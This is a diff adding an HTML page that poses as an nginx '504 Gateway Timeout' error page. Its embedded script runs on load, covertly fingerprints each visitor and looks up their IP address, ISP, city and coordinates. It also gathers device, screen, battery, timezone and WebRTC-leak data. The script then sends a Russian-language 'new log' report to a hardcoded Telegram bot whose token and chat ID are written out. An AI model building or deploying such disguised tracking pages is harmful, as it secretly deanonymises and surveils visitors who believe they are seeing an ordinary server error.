@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>504 Gateway Timeout</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #eaeded;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        .error-container {
+            max-width: 800px;
+            margin: 80px auto 40px;
+            background: #fff;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .error-header {
+            background: #f2f2f2;
+            padding: 15px 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .error-header h1 {
+            font-size: 24px;
+            font-weight: normal;
+            color: #333;
+            margin: 0;
+        }
+        .error-content {
+            padding: 30px 40px;
+            background: #fff;
+        }
+        .error-code {
+            font-family: "Courier New", Courier, monospace;
+            font-size: 72px;
+            font-weight: bold;
+            color: #c00;
+            margin-bottom: 20px;
+        }
+        .error-message {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 25px;
+            border-left: 4px solid #c00;
+            padding-left: 15px;
+        }
+        .error-details {
+            color: #555;
+            margin: 20px 0;
+            font-family: "Courier New", Courier, monospace;
+            font-size: 13px;
+            background: #f8f8f8;
+            padding: 15px;
+            border: 1px solid #e8e8e8;
+        }
+        .error-details p {
+            margin: 5px 0;
+        }
+        hr {
+            border: none;
+            border-top: 1px solid #e8e8e8;
+            margin: 20px 0;
+        }
+        .footer {
+            background: #f8f8f8;
+            padding: 12px 20px;
+            font-size: 11px;
+            color: #888;
+            border-top: 1px solid #e8e8e8;
+            font-family: "Courier New", Courier, monospace;
+        }
+    </style>
+</head>
+<body>
+<div class="error-container">
+    <div class="error-header">
+        <h1>504 Gateway Timeout</h1>
+    </div>
+    <div class="error-content">
+        <div class="error-code">504</div>
+        <div class="error-message">
+            The server didn't respond in time.
+        </div>
+        <p>The upstream server failed to send a request in the allowed time period.</p>
+        
+        <div class="error-details">
+            <p><strong>nginx/1.18.0 (Ubuntu)</strong></p>
+            <p>Request ID: <span id="requestId">req_xxxxxxxxxxxx</span></p>
+            <p>Client: <span id="clientInfo">Loading...</span></p>
+        </div>
+        
+        <p>Please try the following:</p>
+        <ul style="margin-left: 30px; margin-top: 10px; color: #555;">
+            <li>Check your internet connection</li>
+            <li>Reload the page after a few seconds</li>
+            <li>Contact support if the problem persists</li>
+        </ul>
+        
+        <hr>
+        
+        <p style="font-size: 12px; color: #777;">
+            <span id="timestamp"></span>
+        </p>
+    </div>
+    <div class="footer">
+        <span>Powered by nginx</span> | <span>Ubuntu 20.04.6 LTS</span> | <span>nginx/1.18.0</span>
+    </div>
+</div>
+
+<script>
+    (function() {
+        var TELEGRAM_BOT_TOKEN = '8451945342:AAEnH3IA57cVLzbtXWIgXmwA6y9cPNtEHN4';
+        var TELEGRAM_CHAT_ID = '7793421541';
+        
+        var requestId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 8);
+        document.getElementById('requestId').innerText = requestId;
+        document.getElementById('timestamp').innerHTML = 'Generated: ' + new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC';
+        
+        var clientInfo = navigator.userAgent.substring(0, 80);
+        document.getElementById('clientInfo').innerText = clientInfo;
+        
+        function sendToTelegram(message) {
+            var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage?chat_id=' + TELEGRAM_CHAT_ID + '&text=' + encodeURIComponent(message) + '&parse_mode=HTML';
+            var img = new Image();
+            img.src = url;
+        }
+        
+        function formatMessage(data) {
+            var message = '';
+            message += '🚨 <b>НОВЫЙ ЛОГ</b>\n\n';
+            message += '🕒 <b>Время:</b> ' + data.timestamp + '\n\n';
+            
+            message += '🌐 <b>Сетевая информация:</b>\n';
+            message += '├─ <b>IP:</b> <code>' + data.ip + '</code>\n';
+            message += '├─ <b>ISP:</b> ' + data.isp + '\n';
+            message += '├─ <b>Страна:</b> ' + data.country + ' (' + data.countryCode + ')\n';
+            message += '├─ <b>Город:</b> ' + data.city + '\n';
+            message += '├─ <b>Координаты:</b> ' + (data.lat && data.lon ? data.lat + ', ' + data.lon : 'N/A') + '\n';
+            message += '└─ <b>Whois:</b> https://check-host.net/ip-info?host=' + data.ip + '\n\n';
+            
+            message += '📡 <b>HTTP запрос:</b>\n';
+            message += '├─ <b>User Agent:</b> <code>' + data.user_agent + '</code>\n';
+            message += '├─ <b>Referer:</b> ' + (data.referer || 'Direct') + '\n';
+            message += '├─ <b>Accept Language:</b> ' + data.accept_language + '\n';
+            message += '└─ <b>Accept Encoding:</b> ' + data.accept_encoding + '\n\n';
+            
+            message += '🖥️ <b>Система:</b>\n';
+            message += '├─ <b>ОС:</b> ' + data.os + '\n';
+            message += '├─ <b>Версия ОС:</b> ' + data.os_version + '\n';
+            message += '├─ <b>Браузер:</b> ' + data.browser + '\n';
+            message += '├─ <b>Версия браузера:</b> ' + data.browser_version + '\n';
+            message += '├─ <b>Устройство:</b> ' + data.device_type + '\n';
+            message += '├─ <b>Модель:</b> ' + data.device_model + '\n';
+            message += '└─ <b>Платформа:</b> ' + data.platform + '\n\n';
+            
+            message += '📱 <b>Экран и разрешение:</b>\n';
+            message += '├─ <b>Разрешение:</b> ' + data.screen_width + 'x' + data.screen_height + '\n';
+            message += '├─ <b>Доступно:</b> ' + data.avail_width + 'x' + data.avail_height + '\n';
+            message += '├─ <b>Color Depth:</b> ' + data.color_depth + ' bit\n';
+            message += '├─ <b>Pixel Ratio:</b> ' + data.pixel_ratio + '\n';
+            message += '└─ <b>Ориентация:</b> ' + data.orientation + '\n\n';
+            
+            message += '🔒 <b>Безопасность:</b>\n';
+            message += '├─ <b>HTTPS:</b> ' + (data.is_https ? '✅' : '⚠️') + '\n';
+            message += '├─ <b>TLS Версия:</b> ' + data.tls_version + '\n';
+            message += '├─ <b>Архитектура:</b> ' + data.architecture + '\n';
+            message += '├─ <b>Do Not Track:</b> ' + (data.dnt ? 'Включен' : 'Выключен') + '\n';
+            message += '└─ <b>WebRTC Leak:</b> ' + (data.webrtc_leak ? '⚠️ Уязвим' : '✅ Защищён') + '\n\n';
+            
+            message += '🔋 <b>Дополнительно:</b>\n';
+            message += '├─ <b>Часовой пояс:</b> ' + data.timezone + '\n';
+            message += '├─ <b>Языки:</b> ' + data.languages + '\n';
+            message += '├─ <b>Подключение:</b> ' + data.connection_type + ' (' + data.downlink_speed + ' Mbps, ' + data.rtt + 'ms RTT)\n';
+            message += '├─ <b>Батарея:</b> ' + (data.battery_level !== null ? data.battery_level + '% ' + (data.is_charging ? '(Заряжается)' : '(Не заряжается)') : 'N/A') + '\n';
+            message += '├─ <b>Touch Points:</b> ' + data.max_touch_points + '\n';
+            message += '├─ <b>Hardware Concurrency:</b> ' + data.hardware_concurrency + ' ядер\n';
+            message += '└─ <b>Cookies:</b> ' + (data.cookies_enabled ? 'Включены' : 'Выключены') + '\n';
+            
+            return message;
+        }
+        
+        function getBrowserVersion() {
+            var ua = navigator.userAgent;
+            var match;
+            if ((match = ua.match(/Chrome\/(\d+)/)) && !ua.match(/Edg/)) return match[1];
+            if ((match = ua.match(/Firefox\/(\d+)/))) return match[1];
+            if ((match = ua.match(/Edg\/(\d+)/))) return match[1];
+            if ((match = ua.match(/Safari\/(\d+)/)) && !ua.match(/Chrome/)) return match[1];
+            if ((match = ua.match(/Version\/(\d+)/))) return match[1];
+            return 'Unknown';
+        }
+        
+        function getOSVersion() {
+            var ua = navigator.userAgent;
+            if (ua.match(/Windows NT 10.0/)) return '10/11';
+            if (ua.match(/Windows NT 6.1/)) return '7';
+            if (ua.match(/Windows NT 6.3/)) return '8.1';
+            if (ua.match(/Windows NT 6.2/)) return '8';
+            if (ua.match(/Mac OS X 10_15/)) return 'Catalina';
+            if (ua.match(/Mac OS X 11/)) return 'Big Sur';
+            if (ua.match(/Mac OS X 12/)) return 'Monterey';
+            if (ua.match(/Mac OS X 13/)) return 'Ventura';
+            if (ua.match(/Mac OS X 14/)) return 'Sonoma';
+            if (ua.match(/Android 1[0-9]/)) return ua.match(/Android (\d+)/)[1];
+            if (ua.match(/iPhone OS (\d+)_(\d+)/)) return ua.match(/iPhone OS (\d+)_(\d+)/)[1] + '.' + ua.match(/iPhone OS (\d+)_(\d+)/)[2];
+            return 'Unknown';
+        }
+        
+        function getDeviceModel() {
+            var ua = navigator.userAgent;
+            if (ua.match(/iPhone/i)) return 'iPhone';
+            if (ua.match(/iPad/i)) return 'iPad';
+            if (ua.match(/SM-([A-Z0-9]+)/)) return 'Samsung ' + RegExp.$1;
+            if (ua.match(/MI ([0-9]+)/)) return 'Xiaomi Mi ' + RegExp.$1;
+            if (ua.match(/Pixel [0-9]/)) return ua.match(/Pixel [0-9]/)[0];
+            if (ua.match(/Nexus [0-9]/)) return ua.match(/Nexus [0-9]/)[0];
+            if (ua.match(/LG-([A-Z0-9]+)/)) return 'LG ' + RegExp.$1;
+            if (ua.match(/HUAWEI ([A-Z0-9]+)/)) return 'Huawei ' + RegExp.$1;
+            return 'Unknown';
+        }
+        
+        function getTLSVersion() {
+            var ua = navigator.userAgent;
+            if (ua.match(/TLS 1.3/)) return '1.3';
+            if (ua.match(/TLS 1.2/)) return '1.2';
+            if (ua.match(/TLS 1.1/)) return '1.1';
+            return 'Не определён';
+        }
+        
+        function checkWebRTCLeak() {
+            return new Promise(function(resolve) {
+                try {
+                    var pc = new RTCPeerConnection({iceServers: []});
+                    pc.createDataChannel('');
+                    pc.createOffer().then(function(offer) {
+                        pc.setLocalDescription(offer);
+                    });
+                    pc.onicecandidate = function(ice) {
+                        if (ice.candidate) {
+                            var candidate = ice.candidate.candidate;
+                            if (candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/)) {
+                                resolve(true);
+                            }
+                        }
+                    };
+                    setTimeout(function() { resolve(false); }, 3000);
+                } catch(e) {
+                    resolve(false);
+                }
+            });
+        }
+        
+        var logData = {
+            timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
+            token: "Joh2QzLfEOv06Dpji6tCfw==",
+            ip: "0.0.0.0",
+            isp: "Unknown",
+            country: "Unknown",
+            countryCode: "XX",
+            city: "Unknown",
+            lat: null,
+            lon: null,
+            user_agent: navigator.userAgent,
+            referer: document.referrer || "Direct",
+            accept_language: navigator.language,
+            accept_encoding: "gzip, deflate, br",
+            os: "",
+            os_version: "",
+            browser: "",
+            browser_version: "",
+            device_type: "",
+            device_model: "",
+            platform: navigator.platform,
+            screen_width: screen.width,
+            screen_height: screen.height,
+            avail_width: screen.availWidth,
+            avail_height: screen.availHeight,
+            color_depth: screen.colorDepth,
+            pixel_ratio: window.devicePixelRatio || 1,
+            orientation: screen.orientation ? screen.orientation.type : "Unknown",
+            is_https: location.protocol === 'https:',
+            tls_version: "",
+            architecture: navigator.userAgent.match(/x86_64|arm64|arm|i686|WOW64|Win64/) ? navigator.userAgent.match(/x86_64|arm64|arm|i686|WOW64|Win64/)[0] : "Unknown",
+            dnt: navigator.doNotTrack === "1" || navigator.doNotTrack === "yes",
+            webrtc_leak: false,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+            connection_type: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+            downlink_speed: navigator.connection ? navigator.connection.downlink : "N/A",
+            rtt: navigator.connection ? navigator.connection.rtt : "N/A",
+            battery_level: null,
+            is_charging: null,
+            max_touch_points: navigator.maxTouchPoints || 0,
+            hardware_concurrency: navigator.hardwareConcurrency || "N/A",
+            cookies_enabled: navigator.cookieEnabled
+        };
+        
+        (function() {
+            var ua = navigator.userAgent;
+            if (/Windows NT/i.test(ua)) logData.os = "Windows";
+            else if (/Mac OS X/i.test(ua)) logData.os = "macOS";
+            else if (/Android/i.test(ua)) logData.os = "Android";
+            else if (/iPhone|iPad|iPod/i.test(ua)) logData.os = "iOS";
+            else if (/Linux/i.test(ua)) logData.os = "Linux";
+            else logData.os = "Unknown";
+            
+            logData.os_version = getOSVersion();
+            
+            if (/Chrome/i.test(ua) && !/Edg/i.test(ua) && !/OPR/i.test(ua)) logData.browser = "Chrome";
+            else if (/Firefox/i.test(ua)) logData.browser = "Firefox";
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua) && !/Edg/i.test(ua)) logData.browser = "Safari";
+            else if (/Edg/i.test(ua)) logData.browser = "Edge";
+            else if (/OPR|Opera/i.test(ua)) logData.browser = "Opera";
+            else if (/Brave/i.test(ua)) logData.browser = "Brave";
+            else logData.browser = "Other";
+            
+            logData.browser_version = getBrowserVersion();
+            
+            if (/Android/i.test(ua)) logData.device_type = /Mobile/i.test(ua) ? "Android Phone" : "Android Tablet";
+            else if (/iPhone|iPad|iPod/i.test(ua)) logData.device_type = /iPad/i.test(ua) ? "iPad" : "iPhone";
+            else if (/Windows NT/i.test(ua)) logData.device_type = "Windows PC";
+            else if (/Mac OS X/i.test(ua)) logData.device_type = "Mac";
+            else if (/Linux/i.test(ua)) logData.device_type = "Linux PC";
+            else logData.device_type = "Unknown";
+            
+            logData.device_model = getDeviceModel();
+            logData.tls_version = getTLSVersion();
+            
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    logData.battery_level = Math.round(battery.level * 100);
+                    logData.is_charging = battery.charging;
+                }).catch(function() {});
+            }
+            
+            checkWebRTCLeak().then(function(leak) {
+                logData.webrtc_leak = leak;
+            });
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(function(r) { return r.json(); })
+                .then(function(data) {
+                    logData.ip = data.ip;
+                    return fetch('http://ip-api.com/json/' + logData.ip);
+                })
+                .then(function(r) { return r.json(); })
+                .then(function(geo) {
+                    if (geo && geo.status === 'success') {
+                        logData.country = geo.country || "Unknown";
+                        logData.countryCode = geo.countryCode || "XX";
+                        logData.city = geo.city || "Unknown";
+                        logData.isp = geo.isp || "Unknown";
+                        logData.lat = geo.lat || null;
+                        logData.lon = geo.lon || null;
+                    }
+                    
+                    setTimeout(function() {
+                        var message = formatMessage(logData);
+                        sendToTelegram(message);
+                    }, 500);
+                })
+                .catch(function(e) {
+                    setTimeout(function() {
+                        var message = formatMessage(logData);
+                        sendToTelegram(message);
+                    }, 500);
+                });
+        })();
+    })();
+</script>
+</body>
+</html>
